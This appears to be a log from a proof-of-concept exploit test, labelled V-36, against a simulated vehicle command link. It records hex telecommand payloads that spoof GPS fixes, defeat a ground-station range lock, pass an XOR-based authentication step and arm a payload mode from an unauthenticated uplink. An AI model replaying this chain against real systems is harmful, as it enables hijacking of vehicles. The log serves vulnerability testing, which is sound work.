@@ -1,0 +1,49 @@
+[   0.000] ========================================================================
+[   0.000] V-36 GPS spoof -> GS gate bypass chain
+[   0.000] ========================================================================
+[   0.000] --> TC apid=0x14 via=radio AES  payload=00564415a0004353801a060009
+[   0.000] <-- TM apid=0x0E clear len=18
+[   0.000] spoofed fix: Tokyo (lat_e7=356800000) accepted without any checksum or source authentication
+[   0.000] --> TC apid=0x11 via=radio AES  payload=01
+[   0.001] <-- TM apid=0x09 AES len=14
+[   0.001] <-- TM apid=0x11 AES len=9
+[   0.001] GS_MODE(ON) -> 'GS RANGE LOCK': the arming itself is range-gated
+[   0.001] --> TC apid=0x25 via=usb AES  payload=0090
+[   0.002] <-- TM apid=0x25 clear len=4
+[   0.002] --> TC apid=0x14 via=radio AES  payload=406c841500e055bb801a060009
+[   0.002] with plausibility gate: reject counter=1 (position held in Tokyo)
+[   0.002] --> advance(60000 ms)
+[   0.004] <-- TM apid=0x08 AES len=20
+[   0.004] <-- TM apid=0x01 AES len=8
+[   0.005] <-- TM apid=0x0E AES len=30
+[   0.005] <-- TM apid=0x08 AES len=20
+[   0.006] <-- TM apid=0x3FF AES len=14
+[   0.006] <-- TM apid=0x01 AES len=8
+[   0.006] <-- TM apid=0x08 AES len=20
+[   0.007] <-- TM apid=0x0E AES len=30
+[   0.007] <-- TM apid=0x08 AES len=20
+[   0.007] <-- TM apid=0x3FF AES len=14
+[   0.007] <-- TM apid=0x01 AES len=8
+[   0.007] --> TC apid=0x14 via=radio AES  payload=b8168f15900f5fbb801a060009
+[   0.008] <-- TM apid=0x0E clear len=18
+[   0.008] --> TC apid=0x13 via=usb AES  payload=-
+[   0.008] <-- TM apid=0x13 AES len=23
+[   0.008] 9500 km in 60 s accepted -> vehicle back inside the footprint (GS range field now 0 m)
+[   0.008] --> TC apid=0x13 via=usb AES  payload=-
+[   0.009] <-- TM apid=0x13 AES len=23
+[   0.009] --> TC apid=0x11 via=radio AES  payload=01
+[   0.009] <-- TM apid=0x11 AES len=9
+[   0.010] --> TC apid=0x0C via=radio AES  payload=-
+[   0.010] <-- TM apid=0x09 AES len=17
+[   0.011] <-- TM apid=0x13 AES len=23
+[   0.011] GS AUTH REQUIRED on a plain GET_STATUS -> session needed
+[   0.011] --> TC apid=0x12 via=radio AES  payload=00
+[   0.011] <-- TM apid=0x12 AES len=13
+[   0.011] --> TC apid=0x12 via=radio AES  payload=01df84ec6a
+[   0.012] <-- TM apid=0x12 AES len=13
+[   0.012] --> TC apid=0x0D via=radio AES  payload=02
+[   0.012] <-- TM apid=0x0D AES len=4
+[   0.012] chain complete: NMEA spoof -> range dissolved -> XOR auth -> PAYLOAD mode armed, all from an unauthenticated uplink
+[   0.012] ========================================================================
+[   0.012] POC OK
+[   0.012] ========================================================================
